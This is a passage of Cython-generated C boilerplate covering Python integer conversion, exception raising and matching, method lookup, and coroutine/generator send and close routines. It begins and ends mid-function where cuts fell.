                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* FastTypeChecks */
    #if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* RaiseException */
    #if PY_MAJOR_VERSION < 3
static void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb,
                        CYTHON_UNUSED PyObject *cause) {
    __Pyx_PyThreadState_declare
    Py_XINCREF(type);
    if (!value || value == Py_None)
        value = NULL;
    else
        Py_INCREF(value);
    if (!tb || tb == Py_None)
        tb = NULL;
    else {
        Py_INCREF(tb);
        if (!PyTraceBack_Check(tb)) {
            PyErr_SetString(PyExc_TypeError,
                "raise: arg 3 must be a traceback or None");
            goto raise_error;
        }
    }
    if (PyType_Check(type)) {
#if CYTHON_COMPILING_IN_PYPY
        if (!value) {
            Py_INCREF(Py_None);
            value = Py_None;
        }
#endif
        PyErr_NormalizeException(&type, &value, &tb);
    } else {
        if (value) {
            PyErr_SetString(PyExc_TypeError,
                "instance exception may not have a separate value");
            goto raise_error;
        }
        value = type;
        type = (PyObject*) Py_TYPE(type);
        Py_INCREF(type);
        if (!PyType_IsSubtype((PyTypeObject *)type, (PyTypeObject *)PyExc_BaseException)) {
            PyErr_SetString(PyExc_TypeError,
                "raise: exception class must be a subclass of BaseException");
            goto raise_error;
        }
    }
    __Pyx_PyThreadState_assign
    __Pyx_ErrRestore(type, value, tb);
    return;
raise_error:
    Py_XDECREF(value);
    Py_XDECREF(type);
    Py_XDECREF(tb);
    return;
}
#else
static void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb, PyObject *cause) {
    PyObject* owned_instance = NULL;
    if (tb == Py_None) {
        tb = 0;
    } else if (tb && !PyTraceBack_Check(tb)) {
        PyErr_SetString(PyExc_TypeError,
            "raise: arg 3 must be a traceback or None");
        goto bad;
    }
    if (value == Py_None)
        value = 0;
    if (PyExceptionInstance_Check(type)) {
        if (value) {
            PyErr_SetString(PyExc_TypeError,
                "instance exception may not have a separate value");
            goto bad;
        }
        value = type;
        type = (PyObject*) Py_TYPE(value);
    } else if (PyExceptionClass_Check(type)) {
        PyObject *instance_class = NULL;
        if (value && PyExceptionInstance_Check(value)) {
            instance_class = (PyObject*) Py_TYPE(value);
            if (instance_class != type) {
                int is_subclass = PyObject_IsSubclass(instance_class, type);
                if (!is_subclass) {
                    instance_class = NULL;
                } else if (unlikely(is_subclass == -1)) {
                    goto bad;
                } else {
                    type = instance_class;
                }
            }
        }
        if (!instance_class) {
            PyObject *args;
            if (!value)
                args = PyTuple_New(0);
            else if (PyTuple_Check(value)) {
                Py_INCREF(value);
                args = value;
            } else
                args = PyTuple_Pack(1, value);
            if (!args)
                goto bad;
            owned_instance = PyObject_Call(type, args, NULL);
            Py_DECREF(args);
            if (!owned_instance)
                goto bad;
            value = owned_instance;
            if (!PyExceptionInstance_Check(value)) {
                PyErr_Format(PyExc_TypeError,
                             "calling %R should have returned an instance of "
                             "BaseException, not %R",
                             type, Py_TYPE(value));
                goto bad;
            }
        }
    } else {
        PyErr_SetString(PyExc_TypeError,
            "raise: exception class must be a subclass of BaseException");
        goto bad;
    }
    if (cause) {
        PyObject *fixed_cause;
        if (cause == Py_None) {
            fixed_cause = NULL;
        } else if (PyExceptionClass_Check(cause)) {
            fixed_cause = PyObject_CallObject(cause, NULL);
            if (fixed_cause == NULL)
                goto bad;
        } else if (PyExceptionInstance_Check(cause)) {
            fixed_cause = cause;
            Py_INCREF(fixed_cause);
        } else {
            PyErr_SetString(PyExc_TypeError,
                            "exception causes must derive from "
                            "BaseException");
            goto bad;
        }
        PyException_SetCause(value, fixed_cause);
    }
    PyErr_SetObject(type, value);
    if (tb) {
#if CYTHON_COMPILING_IN_PYPY
        PyObject *tmp_type, *tmp_value, *tmp_tb;
        PyErr_Fetch(&tmp_type, &tmp_value, &tmp_tb);
        Py_INCREF(tb);
        PyErr_Restore(tmp_type, tmp_value, tb);
        Py_XDECREF(tmp_tb);
#else
        PyThreadState *tstate = __Pyx_PyThreadState_Current;
        PyObject* tmp_tb = tstate->curexc_traceback;
        if (tb != tmp_tb) {
            Py_INCREF(tb);
            tstate->curexc_traceback = tb;
            Py_XDECREF(tmp_tb);
        }
#endif
    }
bad:
    Py_XDECREF(owned_instance);
    return;
}
#endif

/* PyObjectGetMethod */
    static int __Pyx_PyObject_GetMethod(PyObject *obj, PyObject *name, PyObject **method) {
    PyObject *attr;
#if CYTHON_UNPACK_METHODS && CYTHON_COMPILING_IN_CPYTHON && CYTHON_USE_PYTYPE_LOOKUP
    PyTypeObject *tp = Py_TYPE(obj);
    PyObject *descr;
    descrgetfunc f = NULL;
    PyObject **dictptr, *dict;
    int meth_found = 0;
    assert (*method == NULL);
    if (unlikely(tp->tp_getattro != PyObject_GenericGetAttr)) {
        attr = __Pyx_PyObject_GetAttrStr(obj, name);
        goto try_unpack;
    }
    if (unlikely(tp->tp_dict == NULL) && unlikely(PyType_Ready(tp) < 0)) {
        return 0;
    }
    descr = _PyType_Lookup(tp, name);
    if (likely(descr != NULL)) {
        Py_INCREF(descr);
#if PY_MAJOR_VERSION >= 3
        #ifdef __Pyx_CyFunction_USED
        if (likely(PyFunction_Check(descr) || (Py_TYPE(descr) == &PyMethodDescr_Type) || __Pyx_CyFunction_Check(descr)))
        #else
        if (likely(PyFunction_Check(descr) || (Py_TYPE(descr) == &PyMethodDescr_Type)))
        #endif
#else
        #ifdef __Pyx_CyFunction_USED
        if (likely(PyFunction_Check(descr) || __Pyx_CyFunction_Check(descr)))
        #else
        if (likely(PyFunction_Check(descr)))
        #endif
#endif
        {
            meth_found = 1;
        } else {
            f = Py_TYPE(descr)->tp_descr_get;
            if (f != NULL && PyDescr_IsData(descr)) {
                attr = f(descr, obj, (PyObject *)Py_TYPE(obj));
                Py_DECREF(descr);
                goto try_unpack;
            }
        }
    }
    dictptr = _PyObject_GetDictPtr(obj);
    if (dictptr != NULL && (dict = *dictptr) != NULL) {
        Py_INCREF(dict);
        attr = __Pyx_PyDict_GetItemStr(dict, name);
        if (attr != NULL) {
            Py_INCREF(attr);
            Py_DECREF(dict);
            Py_XDECREF(descr);
            goto try_unpack;
        }
        Py_DECREF(dict);
    }
    if (meth_found) {
        *method = descr;
        return 1;
    }
    if (f != NULL) {
        attr = f(descr, obj, (PyObject *)Py_TYPE(obj));
        Py_DECREF(descr);
        goto try_unpack;
    }
    if (descr != NULL) {
        *method = descr;
        return 0;
    }
    PyErr_Format(PyExc_AttributeError,
#if PY_MAJOR_VERSION >= 3
                 "'%.50s' object has no attribute '%U'",
                 tp->tp_name, name);
#else
                 "'%.50s' object has no attribute '%.400s'",
                 tp->tp_name, PyString_AS_STRING(name));
#endif
    return 0;
#else
    attr = __Pyx_PyObject_GetAttrStr(obj, name);
    goto try_unpack;
#endif
try_unpack:
#if CYTHON_UNPACK_METHODS
    if (likely(attr) && PyMethod_Check(attr) && likely(PyMethod_GET_SELF(attr) == obj)) {
        PyObject *function = PyMethod_GET_FUNCTION(attr);
        Py_INCREF(function);
        Py_DECREF(attr);
        *method = function;
        return 1;
    }
#endif
    *method = attr;
    return 0;
}

/* PyObjectCallMethod1 */
    static PyObject* __Pyx__PyObject_CallMethod1(PyObject* method, PyObject* arg) {
    PyObject *result = __Pyx_PyObject_CallOneArg(method, arg);
    Py_DECREF(method);
    return result;
}
static PyObject* __Pyx_PyObject_CallMethod1(PyObject* obj, PyObject* method_name, PyObject* arg) {
    PyObject *method = NULL, *result;
    int is_method = __Pyx_PyObject_GetMethod(obj, method_name, &method);
    if (likely(is_method)) {
        result = __Pyx_PyObject_Call2Args(method, obj, arg);
        Py_DECREF(method);
        return result;
    }
    if (unlikely(!method)) return NULL;
    return __Pyx__PyObject_CallMethod1(method, arg);
}

/* CoroutineBase */
    #include <structmember.h>
#include <frameobject.h>
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
#define __Pyx_Coroutine_Undelegate(gen) Py_CLEAR((gen)->yieldfrom)
static int __Pyx_PyGen__FetchStopIterationValue(CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject **pvalue) {
    PyObject *et, *ev, *tb;
    PyObject *value = NULL;
    __Pyx_ErrFetch(&et, &ev, &tb);
    if (!et) {
        Py_XDECREF(tb);
        Py_XDECREF(ev);
        Py_INCREF(Py_None);
        *pvalue = Py_None;
        return 0;
    }
    if (likely(et == PyExc_StopIteration)) {
        if (!ev) {
            Py_INCREF(Py_None);
            value = Py_None;
        }
#if PY_VERSION_HEX >= 0x030300A0
        else if (Py_TYPE(ev) == (PyTypeObject*)PyExc_StopIteration) {
            value = ((PyStopIterationObject *)ev)->value;
            Py_INCREF(value);
            Py_DECREF(ev);
        }
#endif
        else if (unlikely(PyTuple_Check(ev))) {
            if (PyTuple_GET_SIZE(ev) >= 1) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                value = PyTuple_GET_ITEM(ev, 0);
                Py_INCREF(value);
#else
                value = PySequence_ITEM(ev, 0);
#endif
            } else {
                Py_INCREF(Py_None);
                value = Py_None;
            }
            Py_DECREF(ev);
        }
        else if (!__Pyx_TypeCheck(ev, (PyTypeObject*)PyExc_StopIteration)) {
            value = ev;
        }
        if (likely(value)) {
            Py_XDECREF(tb);
            Py_DECREF(et);
            *pvalue = value;
            return 0;
        }
    } else if (!__Pyx_PyErr_GivenExceptionMatches(et, PyExc_StopIteration)) {
        __Pyx_ErrRestore(et, ev, tb);
        return -1;
    }
    PyErr_NormalizeException(&et, &ev, &tb);
    if (unlikely(!PyObject_TypeCheck(ev, (PyTypeObject*)PyExc_StopIteration))) {
        __Pyx_ErrRestore(et, ev, tb);
        return -1;
    }
    Py_XDECREF(tb);
    Py_DECREF(et);
#if PY_VERSION_HEX >= 0x030300A0
    value = ((PyStopIterationObject *)ev)->value;
    Py_INCREF(value);
    Py_DECREF(ev);
#else
    {
        PyObject* args = __Pyx_PyObject_GetAttrStr(ev, __pyx_n_s_args);
        Py_DECREF(ev);
        if (likely(args)) {
            value = PySequence_GetItem(args, 0);
            Py_DECREF(args);
        }
        if (unlikely(!value)) {
            __Pyx_ErrRestore(NULL, NULL, NULL);
            Py_INCREF(Py_None);
            value = Py_None;
        }
    }
#endif
    *pvalue = value;
    return 0;
}
static CYTHON_INLINE
void __Pyx_Coroutine_ExceptionClear(__Pyx_ExcInfoStruct *exc_state) {
    PyObject *t, *v, *tb;
    t = exc_state->exc_type;
    v = exc_state->exc_value;
    tb = exc_state->exc_traceback;
    exc_state->exc_type = NULL;
    exc_state->exc_value = NULL;
    exc_state->exc_traceback = NULL;
    Py_XDECREF(t);
    Py_XDECREF(v);
    Py_XDECREF(tb);
}
#define __Pyx_Coroutine_AlreadyRunningError(gen)  (__Pyx__Coroutine_AlreadyRunningError(gen), (PyObject*)NULL)
static void __Pyx__Coroutine_AlreadyRunningError(CYTHON_UNUSED __pyx_CoroutineObject *gen) {
    const char *msg;
    if ((0)) {
    #ifdef __Pyx_Coroutine_USED
    } else if (__Pyx_Coroutine_Check((PyObject*)gen)) {
        msg = "coroutine already executing";
    #endif
    #ifdef __Pyx_AsyncGen_USED
    } else if (__Pyx_AsyncGen_CheckExact((PyObject*)gen)) {
        msg = "async generator already executing";
    #endif
    } else {
        msg = "generator already executing";
    }
    PyErr_SetString(PyExc_ValueError, msg);
}
#define __Pyx_Coroutine_NotStartedError(gen)  (__Pyx__Coroutine_NotStartedError(gen), (PyObject*)NULL)
static void __Pyx__Coroutine_NotStartedError(CYTHON_UNUSED PyObject *gen) {
    const char *msg;
    if ((0)) {
    #ifdef __Pyx_Coroutine_USED
    } else if (__Pyx_Coroutine_Check(gen)) {
        msg = "can't send non-None value to a just-started coroutine";
    #endif
    #ifdef __Pyx_AsyncGen_USED
    } else if (__Pyx_AsyncGen_CheckExact(gen)) {
        msg = "can't send non-None value to a just-started async generator";
    #endif
    } else {
        msg = "can't send non-None value to a just-started generator";
    }
    PyErr_SetString(PyExc_TypeError, msg);
}
#define __Pyx_Coroutine_AlreadyTerminatedError(gen, value, closing)  (__Pyx__Coroutine_AlreadyTerminatedError(gen, value, closing), (PyObject*)NULL)
static void __Pyx__Coroutine_AlreadyTerminatedError(CYTHON_UNUSED PyObject *gen, PyObject *value, CYTHON_UNUSED int closing) {
    #ifdef __Pyx_Coroutine_USED
    if (!closing && __Pyx_Coroutine_Check(gen)) {
        PyErr_SetString(PyExc_RuntimeError, "cannot reuse already awaited coroutine");
    } else
    #endif
    if (value) {
        #ifdef __Pyx_AsyncGen_USED
        if (__Pyx_AsyncGen_CheckExact(gen))
            PyErr_SetNone(__Pyx_PyExc_StopAsyncIteration);
        else
        #endif
        PyErr_SetNone(PyExc_StopIteration);
    }
}
static
PyObject *__Pyx_Coroutine_SendEx(__pyx_CoroutineObject *self, PyObject *value, int closing) {
    __Pyx_PyThreadState_declare
    PyThreadState *tstate;
    __Pyx_ExcInfoStruct *exc_state;
    PyObject *retval;
    assert(!self->is_running);
    if (unlikely(self->resume_label == 0)) {
        if (unlikely(value && value != Py_None)) {
            return __Pyx_Coroutine_NotStartedError((PyObject*)self);
        }
    }
    if (unlikely(self->resume_label == -1)) {
        return __Pyx_Coroutine_AlreadyTerminatedError((PyObject*)self, value, closing);
    }
#if CYTHON_FAST_THREAD_STATE
    __Pyx_PyThreadState_assign
    tstate = __pyx_tstate;
#else
    tstate = __Pyx_PyThreadState_Current;
#endif
    exc_state = &self->gi_exc_state;
    if (exc_state->exc_type) {
        #if CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_PYSTON
        #else
        if (exc_state->exc_traceback) {
            PyTracebackObject *tb = (PyTracebackObject *) exc_state->exc_traceback;
            PyFrameObject *f = tb->tb_frame;
            assert(f->f_back == NULL);
            #if PY_VERSION_HEX >= 0x030B00A1
            f->f_back = PyThreadState_GetFrame(tstate);
            #else
            Py_XINCREF(tstate->frame);
            f->f_back = tstate->frame;
            #endif
        }
        #endif
    }
#if CYTHON_USE_EXC_INFO_STACK
    exc_state->previous_item = tstate->exc_info;
    tstate->exc_info = exc_state;
#else
    if (exc_state->exc_type) {
        __Pyx_ExceptionSwap(&exc_state->exc_type, &exc_state->exc_value, &exc_state->exc_traceback);
    } else {
        __Pyx_Coroutine_ExceptionClear(exc_state);
        __Pyx_ExceptionSave(&exc_state->exc_type, &exc_state->exc_value, &exc_state->exc_traceback);
    }
#endif
    self->is_running = 1;
    retval = self->body((PyObject *) self, tstate, value);
    self->is_running = 0;
#if CYTHON_USE_EXC_INFO_STACK
    exc_state = &self->gi_exc_state;
    tstate->exc_info = exc_state->previous_item;
    exc_state->previous_item = NULL;
    __Pyx_Coroutine_ResetFrameBackpointer(exc_state);
#endif
    return retval;
}
static CYTHON_INLINE void __Pyx_Coroutine_ResetFrameBackpointer(__Pyx_ExcInfoStruct *exc_state) {
    PyObject *exc_tb = exc_state->exc_traceback;
    if (likely(exc_tb)) {
#if CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_PYSTON
#else
        PyTracebackObject *tb = (PyTracebackObject *) exc_tb;
        PyFrameObject *f = tb->tb_frame;
        Py_CLEAR(f->f_back);
#endif
    }
}
static CYTHON_INLINE
PyObject *__Pyx_Coroutine_MethodReturn(CYTHON_UNUSED PyObject* gen, PyObject *retval) {
    if (unlikely(!retval)) {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        if (!__Pyx_PyErr_Occurred()) {
            PyObject *exc = PyExc_StopIteration;
            #ifdef __Pyx_AsyncGen_USED
            if (__Pyx_AsyncGen_CheckExact(gen))
                exc = __Pyx_PyExc_StopAsyncIteration;
            #endif
            __Pyx_PyErr_SetNone(exc);
        }
    }
    return retval;
}
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03030000 && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
static CYTHON_INLINE
PyObject *__Pyx_PyGen_Send(PyGenObject *gen, PyObject *arg) {
#if PY_VERSION_HEX <= 0x030A00A1
    return _PyGen_Send(gen, arg);
#else
    PyObject *result;
    if (PyIter_Send((PyObject*)gen, arg ? arg : Py_None, &result) == PYGEN_RETURN) {
        if (PyAsyncGen_CheckExact(gen)) {
            assert(result == Py_None);
            PyErr_SetNone(PyExc_StopAsyncIteration);
        }
        else if (result == Py_None) {
            PyErr_SetNone(PyExc_StopIteration);
        }
        else {
            _PyGen_SetStopIterationValue(result);
        }
        Py_CLEAR(result);
    }
    return result;
#endif
}
#endif
static CYTHON_INLINE
PyObject *__Pyx_Coroutine_FinishDelegation(__pyx_CoroutineObject *gen) {
    PyObject *ret;
    PyObject *val = NULL;
    __Pyx_Coroutine_Undelegate(gen);
    __Pyx_PyGen__FetchStopIterationValue(__Pyx_PyThreadState_Current, &val);
    ret = __Pyx_Coroutine_SendEx(gen, val, 0);
    Py_XDECREF(val);
    return ret;
}
static PyObject *__Pyx_Coroutine_Send(PyObject *self, PyObject *value) {
    PyObject *retval;
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject*) self;
    PyObject *yf = gen->yieldfrom;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        PyObject *ret;
        gen->is_running = 1;
        #ifdef __Pyx_Generator_USED
        if (__Pyx_Generator_CheckExact(yf)) {
            ret = __Pyx_Coroutine_Send(yf, value);
        } else
        #endif
        #ifdef __Pyx_Coroutine_USED
        if (__Pyx_Coroutine_Check(yf)) {
            ret = __Pyx_Coroutine_Send(yf, value);
        } else
        #endif
        #ifdef __Pyx_AsyncGen_USED
        if (__pyx_PyAsyncGenASend_CheckExact(yf)) {
            ret = __Pyx_async_gen_asend_send(yf, value);
        } else
        #endif
        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03030000 && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
        if (PyGen_CheckExact(yf)) {
            ret = __Pyx_PyGen_Send((PyGenObject*)yf, value == Py_None ? NULL : value);
        } else
        #endif
        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03050000 && defined(PyCoro_CheckExact) && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
        if (PyCoro_CheckExact(yf)) {
            ret = __Pyx_PyGen_Send((PyGenObject*)yf, value == Py_None ? NULL : value);
        } else
        #endif
        {
            if (value == Py_None)
                ret = Py_TYPE(yf)->tp_iternext(yf);
            else
                ret = __Pyx_PyObject_CallMethod1(yf, __pyx_n_s_send, value);
        }
        gen->is_running = 0;
        if (likely(ret)) {
            return ret;
        }
        retval = __Pyx_Coroutine_FinishDelegation(gen);
    } else {
        retval = __Pyx_Coroutine_SendEx(gen, value, 0);
    }
    return __Pyx_Coroutine_MethodReturn(self, retval);
}
static int __Pyx_Coroutine_CloseIter(__pyx_CoroutineObject *gen, PyObject *yf) {
    PyObject *retval = NULL;
    int err = 0;
    #ifdef __Pyx_Generator_USED
    if (__Pyx_Generator_CheckExact(yf)) {
        retval = __Pyx_Coroutine_Close(yf);
        if (!retval)
            return -1;
    } else
    #endif
    #ifdef __Pyx_Coroutine_USED
    if (__Pyx_Coroutine_Check(yf)) {
        retval = __Pyx_Coroutine_Close(yf);
        if (!retval)
            return -1;
    } else
    if (__Pyx_CoroutineAwait_CheckExact(yf)) {
        retval = __Pyx_CoroutineAwait_Close((__pyx_CoroutineAwaitObject*)yf, NULL);
        if (!retval)
            return -1;
    } else
    #endif
    #ifdef __Pyx_AsyncGen_USED
    if (__pyx_PyAsyncGenASend_CheckExact(yf)) {
        retval = __Pyx_async_gen_asend_close(yf, NULL);
    } else
    if (__pyx_PyAsyncGenAThrow_CheckExact(yf)) {
        retval = __Pyx_async_gen_athrow_close(yf, NULL);
    } else
    #endif
    {
        PyObject *meth;
        gen->is_running = 1;
        meth = __Pyx_PyObject_GetAttrStr(yf, __pyx_n_s_close);
        if (unlikely(!meth)) {
            if (!PyErr_ExceptionMatches(PyExc_AttributeError)) {
                PyErr_WriteUnraisable(yf);
            }
            PyErr_Clear();
        } else {
            retval = PyObject_CallFunction(meth, NULL);
            Py_DECREF(meth);
            if (!retval)
                err = -1;
        }
        gen->is_running = 0;
    }
    Py_XDECREF(retval);
    return err;
}
static PyObject *__Pyx_Generator_Next(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject*) self;
    PyObject *yf = gen->yieldfrom;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        PyObject *ret;
        gen->is_running = 1;
        #ifdef __Pyx_Generator_USED
        if (__Pyx_Generator_CheckExact(yf)) {
            ret = __Pyx_Generator_Next(yf);
        } else
        #endif
        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03030000 && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
        if (PyGen_CheckExact(yf)) {
            ret = __Pyx_PyGen_Send((PyGenObject*)yf, NULL);
        } else
        #endif
        #ifdef __Pyx_Coroutine_USED
        if (__Pyx_Coroutine_Check(yf)) {
            ret = __Pyx_Coroutine_Send(yf, Py_None);
        } else
        #endif
            ret = Py_TYPE(yf)->tp_iternext(yf);
        gen->is_running = 0;
        if (likely(ret)) {
            return ret;
        }
        return __Pyx_Coroutine_FinishDelegation(gen);
    }
    return __Pyx_Coroutine_SendEx(gen, Py_None, 0);
}
static PyObject *__Pyx_Coroutine_Close_Method(PyObject *self, CYTHON_UNUSED PyObject *arg) {
    return __Pyx_Coroutine_Close(self);
}
static PyObject *__Pyx_Coroutine_Close(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    PyObject *retval, *raised_exception;
    PyObject *yf = gen->yieldfrom;
    int err = 0;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        Py_INCREF(yf);
        err = __Pyx_Coroutine_CloseIter(gen, yf);
        __Pyx_Coroutine_Undelegate(gen);
        Py_DECREF(yf);
    }
    if (err == 0)
        PyErr_SetNone(PyExc_GeneratorExit);
    retval = __Pyx_Coroutine_SendEx(gen, NULL, 1);
    if (unlikely(retval)) {
        const char *msg;
        Py_DECREF(retval);
        if ((0)) {
        #ifdef __Pyx_Coroutine_USED
        } else if (__Pyx_Coroutine_Check(self)) {
            msg = "coroutine ignored GeneratorExit";
        #endif
        #ifdef __Pyx_AsyncGen_USED
        } else if (__Pyx_AsyncGen_CheckExact(self)) {
#if PY_VERSION_HEX < 0x03060000
            msg = "async generator ignored GeneratorExit - might require Python 3.6+ finalisation (PEP 525)";
#else
